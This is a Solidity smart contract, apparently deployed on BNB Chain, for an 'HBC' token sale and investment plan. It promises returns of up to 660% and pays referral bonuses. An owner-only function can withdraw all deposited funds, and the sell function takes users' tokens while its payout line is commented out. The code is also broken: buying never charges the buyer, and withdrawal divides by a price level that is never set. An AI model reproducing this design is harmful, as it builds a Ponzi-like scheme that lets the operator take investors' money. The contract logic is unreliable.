/**
 *Submitted for verification at BscScan.com on 2021-08-24
*/

// owner 0xc95E9785E8934e2aD283Af8A8B1ee292F256CB0F
// HYBN  0x29495943a1f6f8518f6C0fc154e63ccAaEF4451C token ether
// hbc   0x94c2775230BdC9d18958F75B30Ee60D7aE720aF7 invest ether
// HYBN 0x1ce91ddadfcea8686eefbdb5dd922ffa59524732  token bnb
// hbc 0x7A116Db07768d558F5CC382895Ec033d6775A83a invest bnb


pragma solidity 0.5.4;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}


contract HBCICO  {
     using SafeMath for uint256;
     
       struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }
     
    struct User {
        uint id;
        address referrer;
        uint256 levelBonus;
        uint256 selfBuy;
        uint256 selfSell;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => uint256) refInvest;
        mapping(uint256 => uint256) refMember;
    }
    
    bool public saleOpen=false;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    Plan[] private investmentPlans_;
    
    uint256 private constant INTEREST_CYCLE = 30 days;

    uint public lastUserId = 2;


    
    
    uint256 public tokenPrice=1e16;
    uint public  total_token_buy = 0;
	uint public  total_token_sale = 0;
	uint public  priceGap = 0;
	uint64 public  priceIndex = 1;
	
	uint public  MINIMUM_BUY = 1e18;
	uint public  MINIMUM_SALE = 1e17;
	
	
    address public owner;
    
    mapping(uint64 => uint) public buyLevel;
    mapping(uint64 => uint) public priceLevel;

  
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId, uint256 block_timestamp);
    event CycleStarted(address indexed user, uint256 walletUsed,  uint256 block_timestamp);
    event TokenDistribution(address indexed sender, address indexed receiver, uint total_token, uint live_rate, uint bnb_amount, uint256 block_timestamp);
    event onWithdraw(address  _user, uint256 withdrawalAmount, uint256 block_timestamp);
    event onInvest(address  _user, uint256 investamount, uint256 block_timestamp);
     event onDirectIncome(address referrer, address  _user, uint256 directIncome, uint256 block_timestamp);
   IBEP20 private hbcToken; 
   //IBEP20 private busdToken; 

    constructor(address ownerAddress, IBEP20 _hbcToken) public 
    {
        owner = ownerAddress;
        
        hbcToken = _hbcToken;
        //busdToken = _busdToken;
        
        investmentPlans_.push(Plan(333,660*60*60*24,333)); //0.333 days and 660%
        investmentPlans_.push(Plan(400,625*60*60*24,400)); //0.40 days and 625%
        investmentPlans_.push(Plan(500,560*60*60*24,500)); //0.50 days and 560%
        investmentPlans_.push(Plan(666,480*60*60*24,666)); //0.666 days and 480%
        investmentPlans_.push(Plan(1000,350*60*60*24,1000)); //1 days and 350%
        
        
        
        investmentPlans_.push(Plan(5000,660*60*60*24,5000)); //5% days and 660%
        investmentPlans_.push(Plan(10000,625*60*60*24,10000)); //10% days and 625%
        investmentPlans_.push(Plan(12000,560*60*60*24,12000)); //12% days and 560%
        investmentPlans_.push(Plan(16000,480*60*60*24,16000)); //16% days and 480%
        investmentPlans_.push(Plan(20000,350*60*60*24,20000)); //20% days and 350%
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            levelBonus: uint(0),
            selfBuy: uint(0),
            selfSell: uint(0),
            planCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
    } 
    
    function() external payable 
    {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function withdrawBalance(uint256 amt,uint8 _type) public 
    {
        require(msg.sender == owner, "onlyOwner");
        if(_type==1)
        msg.sender.transfer(amt);
       // else if(_type==2)
        //busdToken.transfer(msg.sender,amt);
        else
        hbcToken.transfer(msg.sender,amt);
    }
    
   
    
    function registration(address userAddress, address referrerAddress) private 
    {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            levelBonus: 0,
            selfBuy: 0,
            selfSell: 0,
            planCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        lastUserId++;
    //      for(uint8 i=0;i<10;i++)
	   //  {
    //          users[referrerAddress].refMember[i]=users[referrerAddress].refMember[i]+1;
    //          users[referrerAddress].refInvest[i]=users[referrerAddress].refInvest[i]+amount;
    //          if(users[referrerAddress].referrer!=address(0))
    //          referrerAddress=users[referrerAddress].referrer;
    //          else
    //          break;
	   //  }
        

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,block.timestamp);
    }
    
    function _invest(uint256 walletUsed,uint256 _planId,address referrer) public 
    {
        require(hbcToken.balanceOf(msg.sender)>=walletUsed,"Low wallet balance");
        require(hbcToken.allowance(msg.sender,address(this))>=walletUsed,"Allow token first");
       // require(users[msg.sender].levelBonus>=rewardUsed,"Low reward balance");
        require(_planId >= 0 && _planId<5, "Wrong investment plan id");
        hbcToken.transferFrom(msg.sender,address(this),walletUsed);
        uint256 _amount= walletUsed;
        
        if(!isUserExists(msg.sender))
	    {
	        registration(msg.sender, referrer);   
	    }
	    require(isUserExists(msg.sender), "user not exists");
        uint256 planCount = users[msg.sender].planCount;
        
        users[msg.sender].plans[planCount].planId = _planId;
        users[msg.sender].plans[planCount].investmentDate = block.timestamp;
        users[msg.sender].plans[planCount].lastWithdrawalDate = block.timestamp;
        users[msg.sender].plans[planCount].investment = _amount;
        users[msg.sender].plans[planCount].currentDividends = 0;
        users[msg.sender].plans[planCount].isExpired = false;

        users[msg.sender].planCount = users[msg.sender].planCount.add(1);
        
        
         uint256 rplanCount = users[users[msg.sender].referrer].planCount;

        uint256 roidincome;
        
        if(_amount==100*1e18)
	    {
	        roidincome= _amount*333/100000;
	    	
	    }
	    else if(_amount==300*1e18)
	    {
	          roidincome= _amount*400/100000;
	    	
	    }
	    else if(_amount==500*1e18)
	    {
	          roidincome= _amount*500/100000;
	    
	    }
	    else if(_amount==1000*1e18)
	    {
	        roidincome= _amount*666/100000;
	    	 
	    }
	    else if(_amount==5000*1e18)  
	    {
	         roidincome= _amount*1000/100000;
	    
	    }
   

   

        users[users[msg.sender].referrer].plans[rplanCount].planId = _planId+5;

        users[users[msg.sender].referrer].plans[rplanCount].investmentDate = block.timestamp;

        users[users[msg.sender].referrer].plans[rplanCount].lastWithdrawalDate = block.timestamp;

        users[users[msg.sender].referrer].plans[rplanCount].investment = (roidincome);

        users[users[msg.sender].referrer].plans[rplanCount].currentDividends = 0;

        users[users[msg.sender].referrer].plans[rplanCount].isExpired = false;

        users[users[msg.sender].referrer].planCount = users[users[msg.sender].referrer].planCount.add(1);

        emit onInvest(users[msg.sender].referrer, (roidincome),block.timestamp);
        
        if(msg.sender!=owner)
	  //  _calculateReferrerReward(_amount,users[msg.sender].referrer);
	   _get_referral_prcnt(_amount,referrer);
	    emit CycleStarted(msg.sender, walletUsed, block.timestamp);
    }
    
    function _get_referral_prcnt(uint256 _amount, address referrer) private  
    {
         uint256 _directincome;
         
         if(_amount==100*1e18)
	    {
	        _directincome= _amount*5/100;
	    	hbcToken.transfer(referrer ,(_directincome));
	    
	    	
	    }
	    else if(_amount==300*1e18)
	    {
	           _directincome= _amount*8/100;
	       	hbcToken.transfer(referrer ,(_directincome)); 
	    }
	    else if(_amount==500*1e18)
	    {
	          _directincome= _amount*10/100;
	       	hbcToken.transfer(referrer , (_directincome));  
	    }
	    else if(_amount==1000*1e18)
	    {
	        _directincome= _amount*12/100;
	       	hbcToken.transfer(referrer , (_directincome));    
	    }
	    else if(_amount==5000*1e18)  
	    {
	         _directincome= _amount*18/100;
	       	hbcToken.transfer(referrer, (_directincome));      
	    }
	    
	     emit onDirectIncome(referrer,msg.sender, _directincome,block.timestamp);
    }

    function buyToken(uint256 tokenQty) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     require(tokenQty>=MINIMUM_BUY,"Invalid minimum quantity");
	     uint256 buy_amt=(tokenQty/1e18)*tokenPrice;
	     require(hbcToken.balanceOf(msg.sender)>=(buy_amt),"Low Balance");
	     require(hbcToken.allowance(msg.sender,address(this))>=buy_amt,"Invalid buy amount");
	     
	     users[msg.sender].selfBuy=users[msg.sender].selfBuy+tokenQty;
	    // busdToken.transferFrom(msg.sender ,address(this), (buy_amt));
	     hbcToken.transfer(msg.sender , tokenQty);
	     
         total_token_buy=total_token_buy+tokenQty;
		 emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, buy_amt,block.timestamp);					
	 }
	 
	function sellToken(uint256 tokenQty) public payable 
	{
	    address userAddress=msg.sender;
	    require(isUserExists(userAddress), "user is not exists. Register first.");
	    require(saleOpen,"Sale Stopped.");
	    require(hbcToken.balanceOf(userAddress)>=(tokenQty),"Low Balance");
	    require(hbcToken.allowance(userAddress,address(this))>=(tokenQty),"Approve your token First");
	    require(!isContract(userAddress),"Can not be contract");
	    
	    //uint256 busd_amt=(tokenQty/1e18)*priceLevel[priceIndex];
	     
		hbcToken.transferFrom(userAddress ,address(this), (tokenQty));
		//busdToken.transfer(userAddress ,busd_amt);
		 
		users[msg.sender].selfSell=users[msg.sender].selfSell+tokenQty;
		//emit TokenDistribution(userAddress,address(this), tokenQty, priceLevel[priceIndex],block.timestamp);
			// emit TokenDistribution(userAddress, address(this), tokenQty, tokenPrice, buy_amt,block.timestamp);	
		total_token_sale=total_token_sale+tokenQty;
	 }
	 
// 	function _calculateReferrerReward(uint256 _investment, address _referrer) private 
// 	{
// 	     uint256 oldPercent;
// 	     for(uint8 i=0;i<10;i++)
// 	     {
// 	         uint256 refPercent=getPercent(_referrer);
// 	         if(refPercent>oldPercent)
// 	         users[_referrer].levelBonus=users[_referrer].levelBonus+(_investment*refPercent)/1000;
	         
//              users[_referrer].refInvest[i]=users[_referrer].refInvest[i]+_investment;
//              if(users[_referrer].referrer!=address(0))
//              _referrer=users[_referrer].referrer;
//              else
//              break;
// 	     }
//      }
	
	function withdraw() public payable 
	{
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }

            Plan storage plan = investmentPlans_[users[msg.sender].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment , plan.dailyInterest , withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , plan.maxDailyInterest);

            withdrawalAmount += amount;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].currentDividends += amount;
        }
        
        hbcToken.transfer(msg.sender,withdrawalAmount);

        emit onWithdraw(msg.sender, withdrawalAmount/priceLevel[priceIndex],block.timestamp);
    }
    
    function getInvestmentPlanByUID(address _user) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) 
    {
       
        User storage investor = users[_user];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        isExpireds[i] = true;
                        interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                       interests[i] = investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                  interests[i] =  investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

	function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24*30);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24*30);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24*30);
        }

    }
	
// 	function getPercent(address _user) public view returns(uint16)
// 	{
// 	    require(isUserExists(_user),"User Not Exist");
// 	    uint256 totalDirect=users[_user].refMember[0];
// 	    uint256 totalTeam;
// 	    for(uint8 i=0;i<10;i++)
// 	    {
// 	       totalTeam=totalTeam+users[_user].refMember[i]; 
// 	    }
	    
// 	    if(totalDirect>=25 && totalTeam>=500)
// 	    return 25;
// 	    else if(totalDirect>=15 && totalTeam>=250)
// 	    return 20;
// 	    else if(totalDirect>=10 && totalTeam>=50)
// 	    return 15;
// 	    else
// 	    return 5;
	    
// 	}

    function isContract(address _address) public view returns (bool _isContract)
    {
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }    
  
    function token_setting(uint min_buy,  uint min_sale) public payable
    {
           require(msg.sender==owner,"Only Owner");
              MINIMUM_BUY = min_buy;
    	      MINIMUM_SALE = min_sale;
             
    }
    
    function sale_setting(uint8 _type) public payable
    {
           require(msg.sender==owner,"Only Owner");
            if(_type==1)
            saleOpen=true;
            else
            saleOpen=false;
             
    }
    
    
    
    function isUserExists(address user) public view returns (bool) 
    {
        return (users[user].id != 0);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}